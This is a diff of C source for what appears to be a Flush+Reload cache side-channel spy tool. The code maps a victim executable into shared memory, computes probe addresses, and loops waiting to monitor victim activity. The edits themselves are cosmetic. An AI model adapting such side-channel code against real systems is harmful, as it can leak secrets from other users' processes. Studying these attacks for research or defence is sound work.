@@ -198,19 +198,19 @@ void lurk(void *base, char **target_adrs, int adrs_amount)
         {
             printf("Detected victim activity - starting spy\n");
             spy(target_adrs, adrs_amount);
-	    printf("Finished monitoring - waiting for victim activity ...");
+	    printf("Finished monitoring - waiting for victim activity ...\n");
         }
     }
 }
 
 void control()
 {
-    FILE *file_pointer = fopen("/home/jia/Documents/flush-reload/victim", "r");
-    int file_descriptor = fileno(file_pointer);     // hard coded path to open the executable used by the victim 
+    FILE *file_pointer = fopen("/home/jia/Documents/flush-reload/victim", "r"); // hard coded path to open the executable used by the victim 
+    int file_descriptor = fileno(file_pointer);     
     struct stat st_buf;
     fstat(file_descriptor, &st_buf);
     int map_len = st_buf.st_size;
-    void *base = mmap(NULL, map_len, PROT_READ, MAP_SHARED, file_descriptor, 0); // MAP_FILE ignored (?)
+    void *base = mmap(NULL, map_len, PROT_READ, MAP_SHARED, file_descriptor, 0);
     
     if (base == MAP_FAILED) {
         perror("mmap failed!");
@@ -218,31 +218,23 @@ void control()
     }
 
     #ifdef TESTEXEC_UBUNTU
-    adresses_t *targets = file_loader(probe_path);
+    adresses_t *targets = file_loader(probe_path); // load probe adrs
     #endif
 
     char *target_adrs[targets->amount];
     node_t *node_current = targets->probe_adresses;
     for (int i= 0; i<targets->amount; i++)
     {
-        target_adrs[i] = (char *) ((unsigned long)node_current->adrs + (unsigned long) base);
+        target_adrs[i] = (char *) ((unsigned long) node_current->adrs + (unsigned long) base);
         node_current = node_current->next;
     }
     lurk(base, target_adrs, targets->amount);
-
-    munmap(base, map_len);
+    munmap(base, map_len); // this will never be reached
 }
 
 // default address values (?)
 int main()
 {
-    #ifdef DEBUG_PLUS
-    void (*fPtrSpy)() = &spy;
-    int (*fPtrMain)() = &main;
-    void (*fPtrWriter)() = &writer;
-    void (*fPtrControl)() = &control;
-    printf("Adresse der Funktion spy: %p, main %p, writer %p, control %p\n", fPtrSpy, fPtrMain, fPtrWriter, fPtrControl);
-    #endif
     printf("starting\n");
     control();   
     printf("finished\n");   
